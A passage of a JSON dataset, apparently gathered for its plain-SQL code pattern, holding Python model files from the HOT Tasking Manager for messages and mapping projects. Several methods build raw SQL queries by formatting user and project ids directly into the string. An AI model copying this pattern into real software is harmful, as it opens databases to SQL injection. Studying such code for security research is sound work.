[
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/models/postgis/message.py",
        "source": "from server import db\nfrom flask import current_app\nfrom enum import Enum\nfrom server.models.dtos.message_dto import MessageDTO, MessagesDTO\nfrom server.models.postgis.user import User\nfrom server.models.postgis.task import Task\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.utils import timestamp\nfrom server.models.postgis.utils import NotFound\n\nclass MessageType(Enum):\n    \"\"\" Describes the various kinds of messages a user might receive \"\"\"\n    SYSTEM = 1                     # Generic system-generated message\n    BROADCAST = 2                  # Broadcast message from a project manager\n    MENTION_NOTIFICATION = 3       # Notification that user was mentioned in a comment/chat\n    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated\n    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated\n\nclass Message(db.Model):\n    \"\"\" Describes an individual Message a user can send \"\"\"\n    __tablename__ = \"messages\"\n\n    __table_args__ = (\n        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),\n    )\n\n    id = db.Column(db.Integer, primary_key=True)\n    message = db.Column(db.String)\n    subject = db.Column(db.String)\n    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))\n    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)\n    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)\n    task_id = db.Column(db.Integer, index=True)\n    message_type = db.Column(db.Integer, index=True)\n    date = db.Column(db.DateTime, default=timestamp)\n    read = db.Column(db.Boolean, default=False)\n\n    # Relationships\n    from_user = db.relationship(User, foreign_keys=[from_user_id])\n    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')\n    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')\n    task = db.relationship(Task, primaryjoin=\"and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)\",\n        backref='messages')\n\n    @classmethod\n    def from_dto(cls, to_user_id: int, dto: MessageDTO):\n        \"\"\" Creates new message from DTO \"\"\"\n        message = cls()\n        message.subject = dto.subject\n        message.message = dto.message\n        message.from_user_id = dto.from_user_id\n        message.to_user_id = to_user_id\n        message.project_id = dto.project_id\n        message.task_id = dto.task_id\n        if dto.message_type is not None:\n            message.message_type = MessageType(dto.message_type)\n\n        return message\n\n    def as_dto(self) -> MessageDTO:\n        \"\"\" Casts message object to DTO \"\"\"\n        dto = MessageDTO()\n        dto.message_id = self.id\n        dto.message = self.message\n        dto.sent_date = self.date\n        dto.read = self.read\n        dto.subject = self.subject\n        dto.project_id = self.project_id\n        dto.task_id = self.task_id\n        if self.message_type is not None:\n            dto.message_type = MessageType(self.message_type).name\n\n        if self.from_user_id:\n            dto.from_username = self.from_user.username\n\n        return dto\n\n    def add_message(self):\n        \"\"\" Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS\"\"\"\n        current_app.logger.debug('Adding message to session')\n        db.session.add(self)\n\n    def save(self):\n        \"\"\" Save \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    @staticmethod\n    def get_all_contributors(project_id: int):\n        \"\"\" Get all contributors to a project \"\"\"\n        query = '''SELECT mapped_by as contributors from tasks where project_id = {0} and  mapped_by is not null\n                   UNION\n                   SELECT validated_by from tasks where tasks.project_id = {0} and validated_by is not null'''.format(project_id)\n\n        contributors = db.engine.execute(query)\n        return contributors\n\n    def mark_as_read(self):\n        \"\"\" Mark the message in scope as Read \"\"\"\n        self.read = True\n        db.session.commit()\n\n    @staticmethod\n    def get_unread_message_count(user_id: int):\n        \"\"\" Get count of unread messages for user \"\"\"\n        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()\n\n    @staticmethod\n    def get_all_messages(user_id: int) -> MessagesDTO:\n        \"\"\" Gets all messages to the user \"\"\"\n        user_messages = Message.query.filter(Message.to_user_id == user_id).all()\n\n        if len(user_messages) == 0:\n            raise NotFound()\n\n        messages_dto = MessagesDTO()\n        for message in user_messages:\n            messages_dto.user_messages.append(message.as_dto())\n\n        return messages_dto\n\n    @staticmethod\n    def delete_multiple_messages(message_ids: list, user_id: int):\n        \"\"\" Deletes the specified messages to the user \"\"\"\n        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\\\n                delete(synchronize_session=False)\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hotosm/tasking-manager/blob/982d51fcf4f6ab6b1453bebad065999bba5e8942",
        "file_path": "/server/models/postgis/project.py",
        "source": "import json\nimport re\nfrom typing import Optional\nfrom cachetools import TTLCache, cached\n\nimport geojson\nfrom flask import current_app\nfrom geoalchemy2 import Geometry\nfrom shapely.geometry import shape\nfrom sqlalchemy.dialects.postgresql import ARRAY\nfrom sqlalchemy.orm.session import make_transient\nfrom geoalchemy2.shape import to_shape\nfrom shapely.geometry import Polygon\nfrom shapely.ops import transform\nfrom functools import partial\nimport pyproj\nimport dateutil.parser\nimport datetime\n\nfrom server import db\nfrom server.models.dtos.project_dto import ProjectDTO, DraftProjectDTO, ProjectSummary, PMDashboardDTO, ProjectStatsDTO, ProjectUserStatsDTO\nfrom server.models.dtos.tags_dto import TagsDTO\nfrom server.models.postgis.priority_area import PriorityArea, project_priority_areas\nfrom server.models.postgis.project_info import ProjectInfo\nfrom server.models.postgis.project_chat import ProjectChat\nfrom server.models.postgis.statuses import ProjectStatus, ProjectPriority, MappingLevel, TaskStatus, MappingTypes, TaskCreationMode, Editors\nfrom server.models.postgis.tags import Tags\nfrom server.models.postgis.task import Task, TaskHistory\nfrom server.models.postgis.user import User\n\nfrom server.models.postgis.utils import ST_SetSRID, ST_GeomFromGeoJSON, timestamp, ST_Centroid, NotFound, ST_Area, ST_Transform\nfrom server.services.grid.grid_service import GridService\n\n# Secondary table defining many-to-many join for private projects that only defined users can map on\nproject_allowed_users = db.Table(\n    'project_allowed_users',\n    db.metadata,\n    db.Column('project_id', db.Integer, db.ForeignKey('projects.id')),\n    db.Column('user_id', db.BigInteger, db.ForeignKey('users.id'))\n)\n\n# cache mapper counts for 30 seconds\nactive_mappers_cache = TTLCache(maxsize=1024, ttl=30)\n\n\nclass Project(db.Model):\n    \"\"\" Describes a HOT Mapping Project \"\"\"\n    __tablename__ = 'projects'\n\n    # Columns\n    id = db.Column(db.Integer, primary_key=True)\n    status = db.Column(db.Integer, default=ProjectStatus.DRAFT.value, nullable=False)\n    created = db.Column(db.DateTime, default=timestamp, nullable=False)\n    priority = db.Column(db.Integer, default=ProjectPriority.MEDIUM.value)\n    default_locale = db.Column(db.String(10),\n                               default='en')  # The locale that is returned if requested locale not available\n    author_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)\n    mapper_level = db.Column(db.Integer, default=1, nullable=False, index=True)  # Mapper level project is suitable for\n    enforce_mapper_level = db.Column(db.Boolean, default=False)\n    enforce_validator_role = db.Column(db.Boolean, default=False)  # Means only users with validator role can validate\n    enforce_random_task_selection = db.Column(db.Boolean, default=False)  # Force users to edit at random to avoid mapping \"easy\" tasks\n    allow_non_beginners = db.Column(db.Boolean, default=False)\n    private = db.Column(db.Boolean, default=False)  # Only allowed users can validate\n    entities_to_map = db.Column(db.String)\n    changeset_comment = db.Column(db.String)\n    osmcha_filter_id = db.Column(db.String)  # Optional custom filter id for filtering on OSMCha\n    due_date = db.Column(db.DateTime)\n    imagery = db.Column(db.String)\n    josm_preset = db.Column(db.String)\n    last_updated = db.Column(db.DateTime, default=timestamp)\n    license_id = db.Column(db.Integer, db.ForeignKey('licenses.id', name='fk_licenses'))\n    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))\n    centroid = db.Column(Geometry('POINT', srid=4326))\n    task_creation_mode = db.Column(db.Integer, default=TaskCreationMode.GRID.value, nullable=False)\n\n    # Tags\n    mapping_types = db.Column(ARRAY(db.Integer), index=True)\n    organisation_tag = db.Column(db.String, index=True)\n    campaign_tag = db.Column(db.String, index=True)\n\n    # Editors\n    mapping_editors = db.Column(ARRAY(db.Integer), default=[\n                                                            Editors.ID.value,\n                                                            Editors.JOSM.value,\n                                                            Editors.POTLATCH_2.value,\n                                                            Editors.FIELD_PAPERS.value],\n                                                            index=True, nullable=False)\n    validation_editors = db.Column(ARRAY(db.Integer), default=[\n                                                               Editors.ID.value,\n                                                               Editors.JOSM.value,\n                                                               Editors.POTLATCH_2.value,\n                                                               Editors.FIELD_PAPERS.value],\n                                                               index=True, nullable=False)\n\n    # Stats\n    total_tasks = db.Column(db.Integer, nullable=False)\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\n    tasks_bad_imagery = db.Column(db.Integer, default=0, nullable=False)\n\n    # Mapped Objects\n    tasks = db.relationship(Task, backref='projects', cascade=\"all, delete, delete-orphan\", lazy='dynamic')\n    project_info = db.relationship(ProjectInfo, lazy='dynamic', cascade='all')\n    project_chat = db.relationship(ProjectChat, lazy='dynamic', cascade='all')\n    author = db.relationship(User)\n    allowed_users = db.relationship(User, secondary=project_allowed_users)\n    priority_areas = db.relationship(PriorityArea, secondary=project_priority_areas, cascade=\"all, delete-orphan\",\n                                     single_parent=True)\n\n    def create_draft_project(self, draft_project_dto: DraftProjectDTO):\n        \"\"\"\n        Creates a draft project\n        :param draft_project_dto: DTO containing draft project details\n        :param aoi: Area of Interest for the project (eg boundary of project)\n        \"\"\"\n        self.project_info.append(ProjectInfo.create_from_name(draft_project_dto.project_name))\n        self.status = ProjectStatus.DRAFT.value\n        self.author_id = draft_project_dto.user_id\n        self.last_updated = timestamp()\n\n    def set_project_aoi(self, draft_project_dto: DraftProjectDTO):\n        \"\"\" Sets the AOI for the supplied project \"\"\"\n        aoi_geojson = geojson.loads(json.dumps(draft_project_dto.area_of_interest))\n\n        aoi_geometry = GridService.merge_to_multi_polygon(aoi_geojson, dissolve=True)\n\n        valid_geojson = geojson.dumps(aoi_geometry)\n        self.geometry = ST_SetSRID(ST_GeomFromGeoJSON(valid_geojson), 4326)\n        self.centroid = ST_Centroid(self.geometry)\n\n    def set_default_changeset_comment(self):\n        \"\"\" Sets the default changeset comment\"\"\"\n        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']\n        self.changeset_comment = f'{default_comment}-{self.id} {self.changeset_comment}' if self.changeset_comment is not None else f'{default_comment}-{self.id}'\n        self.save()\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def save(self):\n        \"\"\" Save changes to db\"\"\"\n        db.session.commit()\n\n    @staticmethod\n    def clone(project_id: int, author_id: int):\n        \"\"\" Clone project \"\"\"\n\n        cloned_project = Project.get(project_id)\n\n        # Remove clone from session so we can reinsert it as a new object\n        db.session.expunge(cloned_project)\n        make_transient(cloned_project)\n\n        # Re-initialise counters and meta-data\n        cloned_project.total_tasks = 0\n        cloned_project.tasks_mapped = 0\n        cloned_project.tasks_validated = 0\n        cloned_project.tasks_bad_imagery = 0\n        cloned_project.last_updated = timestamp()\n        cloned_project.created = timestamp()\n        cloned_project.author_id = author_id\n        cloned_project.status = ProjectStatus.DRAFT.value\n        cloned_project.id = None  # Reset ID so we get a new ID when inserted\n        cloned_project.geometry = None\n        cloned_project.centroid = None\n\n        db.session.add(cloned_project)\n        db.session.commit()\n\n        # Now add the project info, we have to do it in a two stage commit because we need to know the new project id\n        original_project = Project.get(project_id)\n\n        for info in original_project.project_info:\n            db.session.expunge(info)\n            make_transient(info)  # Must remove the object from the session or it will be updated rather than inserted\n            info.id = None\n            info.project_id_str = str(cloned_project.id)\n            cloned_project.project_info.append(info)\n\n        # Now add allowed users now we know new project id, if there are any\n        for user in original_project.allowed_users:\n            cloned_project.allowed_users.append(user)\n\n        # Add other project metadata\n        cloned_project.priority = original_project.priority\n        cloned_project.default_locale = original_project.default_locale\n        cloned_project.mapper_level = original_project.mapper_level\n        cloned_project.enforce_mapper_level = original_project.enforce_mapper_level\n        cloned_project.enforce_validator_role = original_project.enforce_validator_role\n        cloned_project.enforce_random_task_selection = original_project.enforce_random_task_selection\n        cloned_project.private = original_project.private\n        cloned_project.entities_to_map = original_project.entities_to_map\n        cloned_project.due_date = original_project.due_date\n        cloned_project.imagery = original_project.imagery\n        cloned_project.josm_preset = original_project.josm_preset\n        cloned_project.license_id = original_project.license_id\n        cloned_project.mapping_types = original_project.mapping_types\n        cloned_project.organisation_tag = original_project.organisation_tag\n        cloned_project.campaign_tag = original_project.campaign_tag\n\n        # We try to remove the changeset comment referencing the old project. This\n        #  assumes the default changeset comment has not changed between the old\n        #  project and the cloned. This is a best effort basis.\n        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']\n        changeset_comments = []\n        if original_project.changeset_comment is not None:\n            changeset_comments = original_project.changeset_comment.split(' ')\n        if f'{default_comment}-{original_project.id}' in changeset_comments:\n            changeset_comments.remove(f'{default_comment}-{original_project.id}')\n        cloned_project.changeset_comment = \" \".join(changeset_comments)\n\n        db.session.add(cloned_project)\n        db.session.commit()\n\n        return cloned_project\n\n    @staticmethod\n    def get(project_id: int):\n        \"\"\"\n        Gets specified project\n        :param project_id: project ID in scope\n        :return: Project if found otherwise None\n        \"\"\"\n        return Project.query.get(project_id)\n\n    def update(self, project_dto: ProjectDTO):\n        \"\"\" Updates project from DTO \"\"\"\n        self.status = ProjectStatus[project_dto.project_status].value\n        self.priority = ProjectPriority[project_dto.project_priority].value\n        self.default_locale = project_dto.default_locale\n        self.enforce_mapper_level = project_dto.enforce_mapper_level\n        self.enforce_validator_role = project_dto.enforce_validator_role\n        self.enforce_random_task_selection = project_dto.enforce_random_task_selection\n        self.allow_non_beginners = project_dto.allow_non_beginners\n        self.private = project_dto.private\n        self.mapper_level = MappingLevel[project_dto.mapper_level.upper()].value\n        self.entities_to_map = project_dto.entities_to_map\n        self.changeset_comment = project_dto.changeset_comment\n        self.due_date = project_dto.due_date\n        self.imagery = project_dto.imagery\n        self.josm_preset = project_dto.josm_preset\n        self.last_updated = timestamp()\n        self.license_id = project_dto.license_id\n\n        if project_dto.osmcha_filter_id:\n            # Support simple extraction of OSMCha filter id from OSMCha URL\n            match = re.search('aoi=([\\w-]+)', project_dto.osmcha_filter_id)\n            self.osmcha_filter_id = match.group(1) if match else project_dto.osmcha_filter_id\n        else:\n            self.osmcha_filter_id = None\n\n        if project_dto.organisation_tag:\n            org_tag = Tags.upsert_organistion_tag(project_dto.organisation_tag)\n            self.organisation_tag = org_tag\n        else:\n            self.organisation_tag = None  # Set to none, for cases where a tag could have been removed\n\n        if project_dto.campaign_tag:\n            camp_tag = Tags.upsert_campaign_tag(project_dto.campaign_tag)\n            self.campaign_tag = camp_tag\n        else:\n            self.campaign_tag = None  # Set to none, for cases where a tag could have been removed\n\n        # Cast MappingType strings to int array\n        type_array = []\n        for mapping_type in project_dto.mapping_types:\n            type_array.append(MappingTypes[mapping_type].value)\n        self.mapping_types = type_array\n\n        # Cast Editor strings to int array\n        mapping_editors_array = []\n        for mapping_editor in project_dto.mapping_editors:\n            mapping_editors_array.append(Editors[mapping_editor].value)\n        self.mapping_editors = mapping_editors_array\n\n        validation_editors_array = []\n        for validation_editor in project_dto.validation_editors:\n            validation_editors_array.append(Editors[validation_editor].value)\n        self.validation_editors = validation_editors_array\n\n        # Add list of allowed users, meaning the project can only be mapped by users in this list\n        if hasattr(project_dto, 'allowed_users'):\n            self.allowed_users = []  # Clear existing relationships then re-insert\n            for user in project_dto.allowed_users:\n                self.allowed_users.append(user)\n\n        # Set Project Info for all returned locales\n        for dto in project_dto.project_info_locales:\n\n            project_info = self.project_info.filter_by(locale=dto.locale).one_or_none()\n\n            if project_info is None:\n                new_info = ProjectInfo.create_from_dto(dto)  # Can't find info so must be new locale\n                self.project_info.append(new_info)\n            else:\n                project_info.update_from_dto(dto)\n\n        self.priority_areas = []  # Always clear Priority Area prior to updating\n        if project_dto.priority_areas:\n            for priority_area in project_dto.priority_areas:\n                pa = PriorityArea.from_dict(priority_area)\n                self.priority_areas.append(pa)\n\n        db.session.commit()\n\n    def delete(self):\n        \"\"\" Deletes the current model from the DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def can_be_deleted(self) -> bool:\n        \"\"\" Projects can be deleted if they have no mapped work \"\"\"\n        task_count = self.tasks.filter(Task.task_status != TaskStatus.READY.value).count()\n        if task_count == 0:\n            return True\n        else:\n            return False\n\n    def get_locked_tasks_for_user(self, user_id: int):\n        \"\"\" Gets tasks on project owned by specified user id\"\"\"\n        tasks = self.tasks.filter_by(locked_by=user_id)\n\n        locked_tasks = []\n        for task in tasks:\n            locked_tasks.append(task.id)\n\n        return locked_tasks\n\n    def get_locked_tasks_details_for_user(self, user_id: int):\n        \"\"\" Gets tasks on project owned by specified user id\"\"\"\n        tasks = self.tasks.filter_by(locked_by=user_id)\n\n        locked_tasks = []\n        for task in tasks:\n            locked_tasks.append(task)\n\n        return locked_tasks\n\n    @staticmethod\n    def get_projects_for_admin(admin_id: int, preferred_locale: str) -> PMDashboardDTO:\n        \"\"\" Get projects for admin \"\"\"\n        admins_projects = Project.query.filter_by(author_id=admin_id).all()\n\n        if admins_projects is None:\n            raise NotFound('No projects found for admin')\n\n        admin_projects_dto = PMDashboardDTO()\n        for project in admins_projects:\n            pm_project = project.get_project_summary(preferred_locale)\n            project_status = ProjectStatus(project.status)\n\n            if project_status == ProjectStatus.DRAFT:\n                admin_projects_dto.draft_projects.append(pm_project)\n            elif project_status == ProjectStatus.PUBLISHED:\n                admin_projects_dto.active_projects.append(pm_project)\n            elif project_status == ProjectStatus.ARCHIVED:\n                admin_projects_dto.archived_projects.append(pm_project)\n            else:\n                current_app.logger.error(f'Unexpected state project {project.id}')\n\n        return admin_projects_dto\n\n    def get_project_user_stats(self, user_id: int) -> ProjectUserStatsDTO:\n        \"\"\"Compute project specific stats for a given user\"\"\"\n        stats_dto = ProjectUserStatsDTO()\n        stats_dto.time_spent_mapping = 0\n        stats_dto.time_spent_validating = 0\n        stats_dto.total_time_spent = 0\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = {0} and project_id = {1};\"\"\".format(user_id, self.id)\n        total_mapping_time = db.engine.execute(query)\n        for time in total_mapping_time:\n            total_mapping_time = time[0]\n            if total_mapping_time:\n                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_mapping\n\n        query = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                        WHERE action='LOCKED_FOR_VALIDATION'\n                        and user_id = {0} and project_id = {1};\"\"\".format(user_id, self.id)\n        total_validation_time = db.engine.execute(query)\n        for time in total_validation_time:\n            total_validation_time = time[0]\n            if total_validation_time:\n                stats_dto.time_spent_validating = total_validation_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_validating\n\n        return stats_dto\n\n    def get_project_stats(self) -> ProjectStatsDTO:\n        \"\"\" Create Project Summary model for postgis project object\"\"\"\n        project_stats = ProjectStatsDTO()\n        project_stats.project_id = self.id\n        polygon = to_shape(self.geometry)\n        polygon_aea = transform(\n                            partial(\n                            pyproj.transform,\n                            pyproj.Proj(init='EPSG:4326'),\n                            pyproj.Proj(\n                                proj='aea',\n                                lat1=polygon.bounds[1],\n                                lat2=polygon.bounds[3])),\n                            polygon)\n        area = polygon_aea.area/1000000\n        project_stats.area = area\n        project_stats.total_mappers = db.session.query(User).filter(User.projects_mapped.any(self.id)).count()\n        project_stats.total_tasks = self.total_tasks\n        project_stats.total_comments = db.session.query(ProjectChat).filter(ProjectChat.project_id == self.id).count()\n        project_stats.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,\n                                                                       self.tasks_mapped, self.tasks_validated,\n                                                                       self.tasks_bad_imagery)\n        project_stats.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,\n                                                                          self.tasks_mapped, self.tasks_validated,\n                                                                          self.tasks_bad_imagery)\n        project_stats.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,\n                                                                            self.tasks_mapped, self.tasks_validated,\n                                                                            self.tasks_bad_imagery)\n        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())\n        project_stats.aoi_centroid = geojson.loads(centroid_geojson)\n        unique_mappers = TaskHistory.query.filter(\n                TaskHistory.action == 'LOCKED_FOR_MAPPING',\n                TaskHistory.project_id == self.id\n            ).distinct(TaskHistory.user_id).count()\n        unique_validators = TaskHistory.query.filter(\n                TaskHistory.action == 'LOCKED_FOR_VALIDATION',\n                TaskHistory.project_id == self.id\n            ).distinct(TaskHistory.user_id).count()\n        project_stats.total_time_spent = 0\n        project_stats.total_mapping_time = 0\n        project_stats.total_validation_time = 0\n        project_stats.average_mapping_time = 0\n        project_stats.average_validation_time = 0\n\n        sql = '''SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                 WHERE action='LOCKED_FOR_MAPPING'and project_id = {0};'''.format(self.id)\n        total_mapping_time = db.engine.execute(sql)\n        for row in total_mapping_time:\n            total_mapping_time = row[0]\n            if total_mapping_time:\n                total_mapping_seconds = total_mapping_time.total_seconds()\n                project_stats.total_mapping_time = total_mapping_seconds\n                project_stats.total_time_spent += project_stats.total_mapping_time\n                if unique_mappers:\n                    average_mapping_time = total_mapping_seconds/unique_mappers\n                    project_stats.average_mapping_time = average_mapping_time\n\n        sql = '''SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION' and project_id = {0};'''.format(self.id)\n        total_validation_time = db.engine.execute(sql)\n        for row in total_validation_time:\n            total_validation_time = row[0]\n            if total_validation_time:\n                total_validation_seconds = total_validation_time.total_seconds()\n                project_stats.total_validation_time = total_validation_seconds\n                project_stats.total_time_spent += project_stats.total_validation_time\n                if unique_validators:\n                    average_validation_time = total_validation_seconds/unique_validators\n                    project_stats.average_validation_time = average_validation_time\n\n        return project_stats\n\n    def get_project_summary(self, preferred_locale) -> ProjectSummary:\n        \"\"\" Create Project Summary model for postgis project object\"\"\"\n        summary = ProjectSummary()\n        summary.project_id = self.id\n        priority = self.priority\n        if priority == 0:\n            summary.priority = 'URGENT'\n        elif priority == 1:\n            summary.priority = 'HIGH'\n        elif priority == 2:\n            summary.priority = 'MEDIUM'\n        else:\n            summary.priority = 'LOW'\n        summary.author = User().get_by_id(self.author_id).username\n        polygon = to_shape(self.geometry)\n        polygon_aea = transform(\n                            partial(\n                            pyproj.transform,\n                            pyproj.Proj(init='EPSG:4326'),\n                            pyproj.Proj(\n                                proj='aea',\n                                lat1=polygon.bounds[1],\n                                lat2=polygon.bounds[3])),\n                            polygon)\n        area = polygon_aea.area/1000000\n        summary.area = area\n        summary.campaign_tag = self.campaign_tag\n        summary.changeset_comment = self.changeset_comment\n        summary.created = self.created\n        summary.last_updated = self.last_updated\n        summary.due_date = self.due_date\n        summary.mapper_level = MappingLevel(self.mapper_level).name\n        summary.mapper_level_enforced = self.enforce_mapper_level\n        summary.validator_level_enforced = self.enforce_validator_role\n        summary.organisation_tag = self.organisation_tag\n        summary.status = ProjectStatus(self.status).name\n        summary.entities_to_map = self.entities_to_map\n\n        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())\n        summary.aoi_centroid = geojson.loads(centroid_geojson)\n\n        summary.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,\n                                                                 self.tasks_mapped, self.tasks_validated,\n                                                                 self.tasks_bad_imagery)\n        summary.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,\n                                                                    self.tasks_mapped, self.tasks_validated,\n                                                                    self.tasks_bad_imagery)\n        summary.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,\n                                                                      self.tasks_mapped, self.tasks_validated,\n                                                                      self.tasks_bad_imagery)\n\n        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)\n        summary.name = project_info.name\n        summary.short_description = project_info.short_description\n\n\n        return summary\n\n    def get_project_title(self, preferred_locale):\n        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)\n        return project_info.name\n\n    def get_aoi_geometry_as_geojson(self):\n        \"\"\" Helper which returns the AOI geometry as a geojson object \"\"\"\n        aoi_geojson = db.engine.execute(self.geometry.ST_AsGeoJSON()).scalar()\n        return geojson.loads(aoi_geojson)\n\n    @staticmethod\n    @cached(active_mappers_cache)\n    def get_active_mappers(project_id) -> int:\n        \"\"\" Get count of Locked tasks as a proxy for users who are currently active on the project \"\"\"\n\n        return Task.query \\\n            .filter(Task.task_status.in_((TaskStatus.LOCKED_FOR_MAPPING.value,\n                    TaskStatus.LOCKED_FOR_VALIDATION.value))) \\\n            .filter(Task.project_id == project_id) \\\n            .distinct(Task.locked_by) \\\n            .count()\n\n    def _get_project_and_base_dto(self):\n        \"\"\" Populates a project DTO with properties common to all roles \"\"\"\n        base_dto = ProjectDTO()\n        base_dto.project_id = self.id\n        base_dto.project_status = ProjectStatus(self.status).name\n        base_dto.default_locale = self.default_locale\n        base_dto.project_priority = ProjectPriority(self.priority).name\n        base_dto.area_of_interest = self.get_aoi_geometry_as_geojson()\n        base_dto.aoi_bbox = shape(base_dto.area_of_interest).bounds\n        base_dto.enforce_mapper_level = self.enforce_mapper_level\n        base_dto.enforce_validator_role = self.enforce_validator_role\n        base_dto.enforce_random_task_selection = self.enforce_random_task_selection\n        base_dto.allow_non_beginners = self.allow_non_beginners\n        base_dto.private = self.private\n        base_dto.mapper_level = MappingLevel(self.mapper_level).name\n        base_dto.entities_to_map = self.entities_to_map\n        base_dto.changeset_comment = self.changeset_comment\n        base_dto.osmcha_filter_id = self.osmcha_filter_id\n        base_dto.due_date = self.due_date\n        base_dto.imagery = self.imagery\n        base_dto.josm_preset = self.josm_preset\n        base_dto.campaign_tag = self.campaign_tag\n        base_dto.organisation_tag = self.organisation_tag\n        base_dto.license_id = self.license_id\n        base_dto.created = self.created\n        base_dto.last_updated = self.last_updated\n        base_dto.author = User().get_by_id(self.author_id).username\n        base_dto.active_mappers = Project.get_active_mappers(self.id)\n        base_dto.task_creation_mode = TaskCreationMode(self.task_creation_mode).name\n\n        if self.private:\n            # If project is private it should have a list of allowed users\n            allowed_usernames = []\n            for user in self.allowed_users:\n                allowed_usernames.append(user.username)\n            base_dto.allowed_usernames = allowed_usernames\n\n        if self.mapping_types:\n            mapping_types = []\n            for mapping_type in self.mapping_types:\n                mapping_types.append(MappingTypes(mapping_type).name)\n\n            base_dto.mapping_types = mapping_types\n\n        if self.mapping_editors:\n            mapping_editors = []\n            for mapping_editor in self.mapping_editors:\n                mapping_editors.append(Editors(mapping_editor).name)\n\n            base_dto.mapping_editors = mapping_editors\n\n        if self.validation_editors:\n            validation_editors = []\n            for validation_editor in self.validation_editors:\n                validation_editors.append(Editors(validation_editor).name)\n\n            base_dto.validation_editors = validation_editors\n\n        if self.priority_areas:\n            geojson_areas = []\n            for priority_area in self.priority_areas:\n                geojson_areas.append(priority_area.get_as_geojson())\n\n            base_dto.priority_areas = geojson_areas\n\n        return self, base_dto\n\n    def as_dto_for_mapping(self, locale: str, abbrev: bool) -> Optional[ProjectDTO]:\n        \"\"\" Creates a Project DTO suitable for transmitting to mapper users \"\"\"\n        project, project_dto = self._get_project_and_base_dto()\n\n        if abbrev == False:\n            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection(self.id)\n        else:\n            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection_no_geom(self.id)\n        project_dto.project_info = ProjectInfo.get_dto_for_locale(self.id, locale, project.default_locale)\n\n        return project_dto\n\n    def all_tasks_as_geojson(self):\n        \"\"\" Creates a geojson of all areas \"\"\"\n        project_tasks = Task.get_tasks_as_geojson_feature_collection(self.id)\n\n        return project_tasks\n\n    @staticmethod\n    def get_all_organisations_tag(preferred_locale='en'):\n        query = db.session.query(Project.id,\n                                 Project.organisation_tag,\n                                 Project.private,\n                                 Project.status)\\\n            .join(ProjectInfo)\\\n            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \\\n            .filter(Project.private != True)\\\n            .filter(Project.organisation_tag.isnot(None))\\\n            .filter(Project.organisation_tag != '')\n        query = query.distinct(Project.organisation_tag)\n        query = query.order_by(Project.organisation_tag)\n        tags_dto = TagsDTO()\n        tags_dto.tags = [r[1] for r in query]\n        return tags_dto\n\n    @staticmethod\n    def get_all_campaign_tag(preferred_locale='en'):\n        query = db.session.query(Project.id,\n                                 Project.campaign_tag,\n                                 Project.private,\n                                 Project.status)\\\n            .join(ProjectInfo)\\\n            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \\\n            .filter(Project.private != True)\\\n            .filter(Project.campaign_tag.isnot(None))\\\n            .filter(Project.campaign_tag != '')\n        query = query.distinct(Project.campaign_tag)\n        query = query.order_by(Project.campaign_tag)\n        tags_dto = TagsDTO()\n        tags_dto.tags = [r[1] for r in query]\n        return tags_dto\n\n    @staticmethod\n    def calculate_tasks_percent(target, total_tasks, tasks_mapped, tasks_validated, tasks_bad_imagery):\n        \"\"\" Calculates percentages of contributions \"\"\"\n        if target == 'mapped':\n            return int((tasks_mapped + tasks_validated) / (total_tasks - tasks_bad_imagery) * 100)\n        elif target == 'validated':\n            return int(tasks_validated / (total_tasks - tasks_bad_imagery) * 100)\n        